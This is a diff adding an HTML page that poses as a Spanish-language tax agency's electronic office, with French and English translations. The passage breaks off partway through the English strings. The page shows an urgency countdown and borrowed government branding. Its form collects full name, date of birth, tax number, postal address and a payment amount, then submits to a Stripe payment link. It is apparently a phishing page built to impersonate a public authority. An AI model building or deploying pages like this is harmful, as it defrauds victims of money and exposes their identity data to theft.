@@ -1,0 +1,396 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Oficina electrónica – Identificación</title>
+
+<style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family: Arial, Helvetica, sans-serif;
+}
+
+html,body{
+    height:100%;
+}
+
+/* TOP INFO */
+.top-info{
+    background:#f4f4f4;
+    padding:6px 15px;
+    font-size:13px;
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+}
+ 
+.timer{
+    font-weight:bold;
+    color:#005aa7;
+}
+
+/* HEADER */
+.header{
+    background:#ffffff;
+}
+
+/* 🔵 NAV BAR BLEUE */
+.nav-bar{
+    display:flex;
+    align-items:center;
+    padding:10px 15px;
+    gap:25px;
+    background:#005aa7;
+}
+
+/* LOGOS */
+.logos{
+    display:flex;
+    align-items:center;
+    gap:10px;
+}
+
+.logos img{
+    height:38px;
+    width:auto;
+}
+
+/* ÉCRITURES BLANCHES */
+.nav-bar a{
+    text-decoration:none;
+    color:#ffffff;
+    font-size:14px;
+}
+
+/* SEARCH + ESPACE PERSONNEL */
+.search-box{
+    margin-left:auto;
+    display:flex;
+    gap:10px;
+}
+
+/* BARRE RECHERCHE */
+.search-box input{
+    padding:7px 10px;
+    border:1px solid #ccc;
+    border-radius:3px;
+    font-size:13px;
+    background:#fff;
+    color:#333;
+    height:32px;
+}
+
+/* ❗ ESPACE PERSONNEL — INTACT */
+.account-btn{
+    padding:7px 10px;
+    border:1px solid #ccc;
+    border-radius:3px;
+    font-size:13px;
+    background:#fff;
+    color:#333;
+    height:32px;
+    white-space:nowrap;
+}
+
+/* LANGUAGE SELECT */
+.language-select{
+    margin-left:10px;
+    padding:5px;
+    border-radius:4px;
+    border:1px solid #ccc;
+    height:32px;
+}
+
+/* MAIN */
+.main{
+    min-height:calc(100vh - 250px);
+    display:flex;
+    padding:30px;
+}
+
+.left{
+    flex:1;
+}
+
+.left h1{
+    font-size:26px;
+}
+
+.right{
+    flex:1;
+    padding-left:30px;
+    border-left:1px solid #ddd;
+}
+
+/* FORM */
+.form-group{
+    margin-bottom:18px;
+}
+
+label{
+    display:block;
+    margin-bottom:6px;
+    font-size:14px;
+}
+
+input{
+    width:100%;
+    padding:10px;
+    border:1px solid #ccc;
+    border-radius:4px;
+}
+
+.submit-container{
+    text-align:right;
+    margin-top:20px;
+}
+
+button{
+    background:#005aa7;
+    color:#fff;
+    border:none;
+    padding:10px 28px;
+    border-radius:4px;
+    font-size:14px;
+}
+
+/* FOOTER */
+.footer{
+    background:#005aa7;
+    color:#fff;
+    padding:30px;
+    display:grid;
+    grid-template-columns:repeat(4,1fr);
+    gap:20px;
+    font-size:13px;
+}
+
+.footer h4{
+    margin-bottom:10px;
+}
+
+.footer p{
+    margin:5px 0;
+}
+
+.footer-bottom{
+    background:#003f78;
+    color:#ddd;
+    text-align:center;
+    font-size:12px;
+    padding:10px;
+}
+
+/* MOBILE */
+@media(max-width:768px){
+    .main{
+        flex-direction:column;
+    }
+    .right{
+        border-left:none;
+        padding-left:0;
+    }
+    .footer{
+        grid-template-columns:1fr 1fr;
+    }
+}
+</style>
+</head>
+
+<body>
+
+<div class="top-info">
+    <div>01/02/2026 – 10:48</div>
+    <div class="timer">Sesión expira en: <span id="countdown">24:00:00</span></div>
+</div>
+
+<div class="header">
+    <div class="nav-bar">
+
+        <!-- LOGOS -->
+        <div class="logos">
+            <img src="https://i.imgur.com/8BHab2R.png" alt="Logo 1">
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTg8II_IFYsH1d9DoPP-RuL5g0dt83EDIBxvKc_G3tUPw&s=10" alt="Logo 2">
+        </div>
+
+        <!-- LIENS -->
+        <a href="#" id="link1">Acerca de la Agencia Fiscal</a>
+        <a href="#" id="link2">Información y procedimientos</a>
+        <a href="#" id="link3">Todos los procedimientos</a>
+
+        <div class="search-box">
+            <input type="text" id="search" placeholder="Buscar por impuestos, procedimientos…">
+            <div class="account-btn" id="account">Área personal</div>
+            <select class="language-select" id="langSelect">
+                <option value="es">Español</option>
+                <option value="fr">Français</option>
+                <option value="en">English</option>
+            </select>
+        </div>
+    </div>
+</div>
+
+<div class="main">
+    <div class="left">
+        <h1 id="mainTitle">Identifíquese</h1>
+    </div>
+
+    <div class="right">
+        <form action="https://buy.stripe.com/14A9AScjk2sD6uz4398g001">
+            <div class="form-group">
+                <label id="labelName">Nombre y apellidos</label>
+                <input type="text">
+            </div>
+            <div class="form-group">
+                <label id="labelDOB">Fecha de nacimiento</label>
+                <input type="date">
+            </div>
+            <div class="form-group">
+                <label id="labelTax">Número fiscal</label>
+                <input type="text">
+            </div>
+            <div class="form-group">
+                <label id="labelAmount">Monto a pagar (€)</label>
+                <input type="number">
+            </div>
+            <div class="form-group">
+                <label id="labelAddress">Dirección postal</label>
+                <input type="text">
+            </div>
+            <div class="submit-container">
+                <button type="submit" id="submitBtn">Validar</button>
+            </div>
+        </form>
+    </div>
+</div>
+
+<div class="footer">
+    <div>
+        <h4 id="footer1Title">Agencia Fiscal</h4>
+        <p id="footer1p1">Accesibilidad</p>
+        <p id="footer1p2">Protección de datos</p>
+        <p id="footer1p3">Avisos legales</p>
+        <p id="footer1p4">Seguridad</p>
+    </div>
+    <div>
+        <h4 id="footer2Title">Contáctenos</h4>
+        <p id="footer2p1">Asistencia</p>
+        <p id="footer2p2">Centros fiscales</p>
+        <p id="footer2p3">Reclamaciones</p>
+    </div>
+    <div>
+        <h4 id="footer3Title">Ayuda</h4>
+        <p id="footer3p1">FAQ</p>
+        <p id="footer3p2">Guías de usuario</p>
+        <p id="footer3p3">Simuladores</p>
+    </div>
+    <div>
+        <h4 id="footer4Title">Enlaces de interés</h4>
+        <p id="footer4p1">Ministerio de Finanzas</p>
+        <p id="footer4p2">Servicio público</p>
+        <p id="footer4p3">Aviso legal</p>
+    </div>
+</div>
+
+<div class="footer-bottom" id="footerBottom">
+    ©️ 2026 – Administración pública – Todos los derechos reservados
+</div>
+
+<script>
+// Countdown
+let seconds=86400;
+setInterval(()=>{
+    seconds--;
+    if(seconds<0)return;
+    let h=String(Math.floor(seconds/3600)).padStart(2,'0');
+    let m=String(Math.floor((seconds%3600)/60)).padStart(2,'0');
+    let s=String(seconds%60).padStart(2,'0');
+    document.getElementById("countdown").innerText=`${h}:${m}:${s}`;
+},1000);
+
+// Traductions
+const texts = {
+    es: {
+        mainTitle: "Identifíquese",
+        labelName: "Nombre y apellidos",
+        labelDOB: "Fecha de nacimiento",
+        labelTax: "Número fiscal",
+        labelAmount: "Monto a pagar (€)",
+        labelAddress: "Dirección postal",
+        submitBtn: "Validar",
+        link1: "Acerca de la Agencia Fiscal",
+        link2: "Información y procedimientos",
+        link3: "Todos los procedimientos",
+        search: "Buscar por impuestos, procedimientos…",
+        account: "Área personal",
+        footer1Title: "Agencia Fiscal",
+        footer1p1: "Accesibilidad",
+        footer1p2: "Protección de datos",
+        footer1p3: "Avisos legales",
+        footer1p4: "Seguridad",
+        footer2Title: "Contáctenos",
+        footer2p1: "Asistencia",
+        footer2p2: "Centros fiscales",
+        footer2p3: "Reclamaciones",
+        footer3Title: "Ayuda",
+        footer3p1: "FAQ",
+        footer3p2: "Guías de usuario",
+        footer3p3: "Simuladores",
+        footer4Title: "Enlaces de interés",
+        footer4p1: "Ministerio de Finanzas",
+        footer4p2: "Servicio público",
+        footer4p3: "Aviso legal",
+        footerBottom: "©️ 2026 – Administración pública – Todos los derechos reservados",
+        timer: "Sesión expira en:"
+    },
+    fr: {
+        mainTitle: "Identifiez-vous",
+        labelName: "Nom et prénom",
+        labelDOB: "Date de naissance",
+        labelTax: "Numéro fiscal",
+        labelAmount: "Montant à payer (€)",
+        labelAddress: "Adresse postale",
+        submitBtn: "Valider",
+        link1: "À propos de l’Agence fiscale",
+        link2: "Informations et procédures",
+        link3: "Toutes les procédures",
+        search: "Rechercher par impôts, procédures…",
+        account: "Espace personnel",
+        footer1Title: "Agence fiscale",
+        footer1p1: "Accessibilité",
+        footer1p2: "Protection des données",
+        footer1p3: "Avis juridiques",
+        footer1p4: "Sécurité",
+        footer2Title: "Contactez-nous",
+        footer2p1: "Assistance",
+        footer2p2: "Centres fiscaux",
+        footer2p3: "Réclamations",
+        footer3Title: "Aide",
+        footer3p1: "FAQ",
+        footer3p2: "Guides utilisateurs",
+        footer3p3: "Simulateurs",
+        footer4Title: "Liens d’intérêt",
+        footer4p1: "Ministère des finances",
+        footer4p2: "Service-public",
+        footer4p3: "Mentions légales",
+        footerBottom: "©️ 2026 – Administration publique – Tous droits réservés",
+        timer: "Session expire dans :"
+    },
+    en: {
+        mainTitle: "Sign In",
+        labelName: "Full Name",
+        labelDOB: "Date of Birth",
+        labelTax: "Tax Number",
+        labelAmount: "Amount to Pay (€)",
+        labelAddress: "Postal Address",
+        submitBtn: "Submit",
+        link1: "About the Tax Agency",
+        link2: "Information & Procedures",
+        link3: "All Procedures",
+        search: "Search by taxes, procedures…",
+        account: "Personal Area",
+        footer1Title: "Tax Agency",
+        footer1p1: "Accessibil
